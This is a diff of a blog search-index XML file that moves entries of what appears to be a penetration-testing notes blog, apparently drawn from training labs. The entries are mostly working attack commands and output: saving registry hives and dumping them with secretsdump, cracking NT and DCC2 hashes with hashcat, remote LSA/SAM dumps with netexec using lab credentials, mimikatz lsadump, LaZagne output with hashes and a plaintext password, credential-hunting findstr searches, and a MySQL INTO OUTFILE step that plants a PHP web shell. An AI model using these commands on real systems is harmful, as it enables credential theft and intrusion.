@@ -114,6 +114,44 @@
       </tags>
   </entry>
   <entry>
+    <title>Extracting Passwords from Windows Registry.</title>
+    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
+    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
+<ul>
+<li><p>HKLM\SAM - Contains local user password hashes</p>
+</li>
+<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
+</li>
+<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
+<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
+<p>➜ Dump lsa.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
+
+<p>➜ Dump sam.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
+<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-SAM</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Mssql Enumeration</title>
     <url>/2025/11/20/Mssql-Enumeration/</url>
     <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
@@ -165,44 +203,6 @@
       <tags>
         <tag>MSSQL</tag>
         <tag>Enumeration</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Extracting Passwords from Windows Registry.</title>
-    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
-    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
-<ul>
-<li><p>HKLM\SAM - Contains local user password hashes</p>
-</li>
-<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
-</li>
-<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
-</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
-
-<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
-<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
-<p>➜ Dump lsa.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
-
-<p>➜ Dump sam.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
-<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-SAM</tag>
       </tags>
   </entry>
   <entry>
@@ -282,46 +282,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
-<ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Linux</category>
-        <category>Service-Exploitation</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL Enumeration</title>
     <url>/2025/11/21/MySQL-Enumeration/</url>
     <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
@@ -362,49 +322,43 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows Credential Hunting</title>
-    <url>/2025/11/26/Windows-Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
-<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
-<li><code>Passwords in scripts in the SYSVOL share</code></li>
-<li><code>Password in scripts on IT shares</code></li>
-<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
-<li><code>Password in unattend.xml</code></li>
-<li><code>Passwords in the AD user or computer description fields</code></li>
-<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
-<li><code>Found on user systems and shares</code></li>
-<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
-</ul>
-<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
 <ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
 <ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-<li><code>KeePass memory extraction</code></li>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
 </ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
 
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
-        <category>Active Directory</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
+        <category>Linux</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
       </categories>
       <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
       </tags>
   </entry>
   <entry>
@@ -561,6 +515,53 @@
         <tag>socat</tag>
         <tag>Reverse-Port-Forwarding</tag>
         <tag>Chisel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
       </tags>
   </entry>
 </search>
